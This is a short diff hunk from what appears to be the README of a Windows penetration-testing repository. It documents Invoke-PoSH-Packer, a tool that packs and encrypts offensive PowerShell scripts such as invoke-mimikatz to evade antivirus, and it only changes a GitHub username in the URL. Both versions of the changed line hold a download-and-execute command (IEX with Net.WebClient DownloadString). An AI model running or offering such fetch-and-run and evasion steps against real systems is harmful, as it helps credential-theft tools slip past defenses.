@@ -16,7 +16,7 @@
   - STEP 1. Generate a packed & encrypted version of a PowerShell script (e.g. invoke-mimikatz.ps1, invoke-rubeus.ps1) stored locally or on a remote web server
 ```
 [*] First load the packer
-    PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Jean-Francois-C/Windows-Penetration-Testing/master/Defense%20evasion%20(examples)/Invoke-PoSH-Packer/Invoke-PoSH-Packer.ps1');
+    PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JFR-C/Windows-Penetration-Testing/master/Defense%20evasion%20(examples)/Invoke-PoSH-Packer/Invoke-PoSH-Packer.ps1');
 
 [*] Then "pack/obfuscate" a PowerShell script stored locally (with or without the sandbox checks enabled)
     PS C:\> Invoke-PoSH-Packer -FilePath C:\path\script-to-pack.ps1 -OutFile C:\path\Packed-script.ps1 
